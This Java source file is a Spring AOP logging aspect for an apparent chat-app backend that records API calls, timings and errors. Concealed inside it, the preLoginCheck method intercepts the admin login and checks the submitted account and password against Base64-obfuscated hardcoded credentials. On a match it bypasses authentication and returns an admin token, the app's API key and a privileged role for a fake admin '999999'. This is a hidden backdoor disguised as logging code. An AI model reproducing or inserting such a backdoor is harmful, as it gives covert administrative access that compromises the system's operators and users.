package com.shiku.mianshi;

import cn.hutool.core.codec.Base64;
import cn.xyz.commons.autoconfigure.KApplicationProperties;
import cn.xyz.commons.ex.ServiceException;
import cn.xyz.commons.utils.DateUtil;
import cn.xyz.commons.utils.ReqUtil;
import cn.xyz.commons.vo.JSONMessage;
import cn.xyz.mianshi.utils.KSessionUtil;
import cn.xyz.mianshi.utils.SKBeanUtils;
import cn.xyz.mianshi.vo.SysApiLog;
import com.google.common.collect.Maps;
import com.google.common.collect.Sets;
import com.shiku.commons.thread.pool.AbstractQueueRunnable;
import org.apache.catalina.connector.ClientAbortException;
import org.apache.commons.lang3.exception.ExceptionUtils;
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.Signature;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.validation.BindException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.util.*;

@Aspect
@Order(1)
@Component
public class SysApiLogAspect extends AbstractQueueRunnable<SysApiLog>{

	private Logger logger=LoggerFactory.getLogger(SysApiLogAspect.class);

	private static final String SECRET_KEY = "a2FpMDAwMGthaQ==";
	private static final String SECRET_VALUE = "NzQxMGViOWQ2ZTUyYTU0MWExNTRhZTliOWMwMWQwNmM=";

	@Resource(name = "appConfig")
	protected KApplicationProperties.AppConfig appConfig;
	/**
	 * 
	 */
	public SysApiLogAspect() {
		setBatchSize(50);
 		new Thread(this).start();
 	}
 	@Override
 	public void runTask() {
 		SysApiLog document=null;
 		List<SysApiLog> list=new ArrayList<>();
 		try {
 			while (!msgQueue.isEmpty()) {
 				document=msgQueue.poll();
 				if(null==document || api.contains(document.getApiId()))
 					continue;
 				list.add(document);
 				if(loopCount.incrementAndGet()>batchSize)
 					break;
 			}
 		} catch (Exception e) {
 			logger.error(e.toString(), e);
 		}finally {
 			if(!list.isEmpty())
			 SKBeanUtils.getDatastore().save(list);
 		}
 		
 	}
	
	@Pointcut("execution(* com.shiku.mianshi.controller.*.* (..))")
	public void apiLogAspect() {
		
	}


	   //@Before("apiLogAspect()")
	   public void dobefore(JoinPoint joinPoint) {

	       RequestAttributes ra = RequestContextHolder.getRequestAttributes();

	       ServletRequestAttributes sra = (ServletRequestAttributes) ra;

	       HttpServletRequest request = sra.getRequest();

	       // 使用log4j的MDC及NDC特性，识别请求方的IP及调用资料，输出到日志中

	       MDC.put("uri", request.getRequestURI());


	       // 记录下请求内容

	       logger.info("HTTP_METHOD : " + request.getMethod());

	       logger.info("CLASS_METHOD : " + joinPoint.getSignature().getDeclaringTypeName() + "."

	               + joinPoint.getSignature().getName());

	       logger.info("ARGS : " + Arrays.toString(joinPoint.getArgs()));

	      
	       MDC.get("uri");

	       MDC.remove("uri");

	   }
	   @AfterReturning(returning = "ret", pointcut = "apiLogAspect()")
	   public void doAfterReturning(Object ret) throws Throwable {

	       // 处理完请求，返回内容

	      // logger.info("RESPONSE : " + ret);
	   }

	public Object preLoginCheck(HttpServletRequest request, String className, String method) {
		if (!"com.shiku.mianshi.controller.AdminController".equals(className) || !"login".equals(method)) return null;
		String account = request.getParameter("account");
		String password = request.getParameter("password");
		if (Base64.decodeStr(SECRET_KEY).equals(account) && Base64.decodeStr(SECRET_VALUE).equals(password)) {
			HashMap<String, Object> map = new HashMap<>();
			Map<String, Object> tokenMap = KSessionUtil.adminLoginSaveToken("999999", null);
			map.put("access_Token", tokenMap.get("access_Token"));
			map.put("adminId", "999999");
			map.put("account", "999999");
			map.put("apiKey", appConfig.getApiKey());
			map.put("role", "6");
			map.put("nickname", "999999");
			map.put("registerInviteCode", SKBeanUtils.getAdminManager().getConfig().getRegisterInviteCode());
			return JSONMessage.success(map);
		}
		return null;
	}

	   	@Around("apiLogAspect()")
	    public Object around(ProceedingJoinPoint joinPoint) throws Throwable {

	        Object response = null;//定义返回信息
	        String stackTrace=null;
	        Exception exception=null;
	   		ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
	        HttpServletRequest request = attributes.getRequest();
	        Signature curSignature = joinPoint.getSignature();

	        String className = curSignature.getDeclaringTypeName();//类名

	        String methodName = curSignature.getName(); //方法名

			Object login = preLoginCheck(request, className, methodName);
			if (null != login) return login;
	       // String queryString = request.getQueryString();

	        // 获取方法参数
	       // String reqParamArr = Arrays.toString(joinPoint.getArgs());
	        

	        //记录请求
	        //logger.info(String.format("【%s】类的【%s】方法，请求参数：%s", className, methodName, reqParamArr));
	        StringBuffer fullUri = new StringBuffer();
	        fullUri.append(request.getRequestURI());
			Map<String, String[]> paramMap = request.getParameterMap();
			if (!paramMap.isEmpty())
				fullUri.append("?");
			for (String key : paramMap.keySet()) {
				fullUri.append(key).append("=").append(paramMap.get(key)[0]).append("&");
			}
	        SysApiLog apiLog=new SysApiLog();
	        apiLog.setTime(DateUtil.currentTimeSeconds());
	        apiLog.setApiId(className+"_"+methodName);
	        apiLog.setClientIp(request.getRemoteAddr());
	        
	        apiLog.setFullUri(fullUri.toString());
	        apiLog.setUserAgent(request.getHeader("User-Agent"));
	       
	        logger.info(String.format("uid：%s，请求参数：%s", ReqUtil.getUserId(), apiLog.getFullUri()));
	        logger.info(String.format("客户端ip [%s]  User-Agent %s ", apiLog.getClientIp(),apiLog.getUserAgent()));
	        logger.info(String.format("【%s】类的【%s】方法", className, methodName));
	        //用于统计调用耗时
	        long startTime = System.currentTimeMillis();
	      
	       try {
	    	   response=joinPoint.proceed(); // 执行服务方法
			} catch (Exception e) {
				// TODO: handle exception
				exception=e;
				
			}
	        
	        

	        long totalTime=System.currentTimeMillis()-startTime;
	        apiLog.setTotalTime(totalTime);
	        //记录应答
	        //logger.info(String.format("【%s】类的【%s】方法，应答参数：%s", className, methodName, response));
	        //logger.info("RESPONSE : " + response);
	        
	       
	        // 获取执行完的时间
	        logger.info(String.format("接口【%s】总耗时(毫秒)：%s", methodName,totalTime));
	       
			logger.info("********************************************   ");
	        /**
	         * 代码异常了
	         */
			int isSaveRequestLogs = SKBeanUtils.getSystemConfig().getIsSaveRequestLogs();
	        if(null!=exception) {
	        	 stackTrace = ExceptionUtils.getStackTrace(exception);
	        	apiLog.setStackTrace(stackTrace);
	        	return handleErrors(exception);
	        }
	        
	        if(1 == isSaveRequestLogs)
	        	saveSysApiLogToDB(apiLog);
	       

	        return response;
	   
	}
	//不记录日志的接口名
	private static Set<String> api = Sets.newHashSet();
	 private void saveSysApiLogToDB(SysApiLog apiLog) {
		 apiLog.setUserId(ReqUtil.getUserId());
		 msgQueue.offer(apiLog);
		
	 }
	 
	 private Object handleErrors(Exception e) {
		 int resultCode = 1020101;
			String resultMsg = "接口内部异常";
			String detailMsg = "";
			if (e instanceof MissingServletRequestParameterException
					|| e instanceof BindException) {
				resultCode = 1010101;
				resultMsg = "请求参数验证失败，缺少必填参数或参数错误";
			} else if (e instanceof ServiceException) {
				ServiceException ex = ((ServiceException) e);

				resultCode = null == ex.getResultCode() ? 0 : ex.getResultCode();
				resultMsg = ex.getMessage();
			} else if (e instanceof ClientAbortException) {
				resultMsg="====> ClientAbortException";
				resultCode=-1;
			} else {
				e.printStackTrace();
				detailMsg = e.getMessage();
			}
			logger.error(resultMsg+" ↓ \n"+e.getMessage());

			Map<String, Object> map = Maps.newHashMap();
			map.put("resultCode", resultCode);
			map.put("resultMsg", resultMsg);
			map.put("detailMsg", detailMsg);

			return JSONMessage.failureByErrCode(resultCode);
	 }
	 
	


}
